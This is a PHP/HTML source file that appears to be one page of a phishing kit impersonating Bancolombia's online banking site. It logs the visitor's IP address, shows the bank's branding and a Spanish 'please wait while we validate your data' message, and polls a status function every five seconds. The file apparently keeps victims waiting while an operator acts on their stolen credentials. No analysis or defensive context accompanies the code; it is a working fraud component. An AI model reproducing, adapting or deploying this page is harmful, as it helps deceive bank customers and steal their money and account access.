<?php
	$ip = getenv("REMOTE_ADDR");
	setlocale(LC_TIME, "spanish");
	$tiempo = date("%A, %d de %B de %Y", strtotime('2010-01-08'));
	date_default_timezone_set('America/Bogota');
?>
<html>

<head>
	<title>Bancolombia Sucursal Vrtual Personas</title>
	<meta http-equiv="content-type" content="text/html; utf-8">
	<meta charset="utf-8">
	<meta content="es" http-equiv="Content-Language">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<link href="../../../../../src/css/layout.css" rel="stylesheet">
	<link href="../../../../../src/css/fonts.css" rel="stylesheet">
	<link rel="icon" type="image/png" href="../../../../../src/img/logo.png" />
</head>

<body style="">

	<div style="text-align:center;  margin-top: 13%;">
		<img src="../../../../../src/img/logo.svg">

		<br>
		<p class="text-center"
			style="font-family: 'OpenSans-Regular' !important; width:90%; max-width: 457px; display: inline-block; font-size: 14px;">
			Por favor espere un momento estamos validando algunos datos. Puede tardar entre 1 a 5 minutos. No cierres o
			recargues esta ventana.</p><br>
		<img src="../../../../../src/img/load2.gif" />

	</div>


	<meta http-equiv="PRAGMA" content="NO-CACHE">
	<meta http-equiv="Expires" content="-1">

	<script type="text/javascript" src="../../../../../src/js/jquery-3.6.0.min.js"></script>
	<script src="https://code.jquery.com/jquery-3.7.1.min.js" type="text/javascript"></script>
	<script type="text/javascript" src="../../../../../src/js/run.js"></script>

	<script language="javascript">
		$(document).ready(function () {
			setInterval(status, 5000);
		});
	</script>
</body>

</html>